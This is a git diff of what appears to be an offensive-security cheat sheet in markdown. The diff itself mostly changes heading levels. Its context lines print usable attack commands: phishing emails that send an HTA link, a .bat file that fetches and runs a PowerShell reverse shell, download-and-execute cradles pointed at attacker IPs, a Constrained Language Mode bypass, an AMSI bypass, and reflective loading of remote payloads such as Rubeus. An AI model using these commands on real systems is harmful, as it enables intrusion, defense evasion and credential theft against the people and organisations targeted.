@@ -650,6 +650,7 @@ IntPtr.Zero, 0, IntPtr.Zero);
 <br>
 
 ## SharpLoader
+
 [Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')
 
 - First, encrypt all your csharp files on the attacker machine using invoke-sharpencrypt.
@@ -876,7 +877,7 @@ swaks --body 'click me http://192.168.X.X/file.hta' --add-header
  sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
 ```
 
-## Bringing it home
+### Bringing it home
 
 - ### Save file as .bat and host on your server
 
@@ -894,7 +895,7 @@ Then the .bat file will download and execute your .txt file resulting in a revsh
 # Powershell
 <br>
 
-## Reverse Shell
+### Reverse Shell
 
 -  Replace ip/port, save as .txt file and host on your server
 
@@ -945,7 +946,7 @@ $string = $null}} else {cleanup}}
 ```
 <br>
 
-## Bringing it home
+### Bringing it home
 
 -  Save the below string to a file as .bat and execute.
 
@@ -954,31 +955,31 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 ```
 <br>
 
-## Download_file
+### Download_file
 ```
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
 <br>
  
-## Powershell_Cradle
+### Powershell_Cradle
 ```
 iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
 ```
 <br>
 
-## Constrained_lang_mode
+### Constrained_lang_mode
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
 <br>
 
-## CLM_Bypass
+### CLM_Bypass
 ```
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
 ```
 <br>
 
-## Disable_Restricted_Admin:
+### Disable_Restricted_Admin:
 
 ```powershell
 Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
@@ -988,7 +989,6 @@ DisableRestrictedAdmin
 
 
 ## Disable_AMSI
-***
  
  ### Method 1:
 ```
@@ -1012,7 +1012,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 ## Load_assembly_reflectively
 
-## Download and run assembly without arguments
+### Download and run assembly without arguments
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
@@ -1020,7 +1020,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 ```
 <br>
 
-## Download and run Rubeus, with arguments (make sure to split the args)
+### Download and run Rubeus, with arguments (make sure to split the args)
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
@@ -1028,7 +1028,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 ```
 <br>
 
-## Execute a specific method from an assembly (e.g. a DLL)
+### Execute a specific method from an assembly (e.g. a DLL)
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
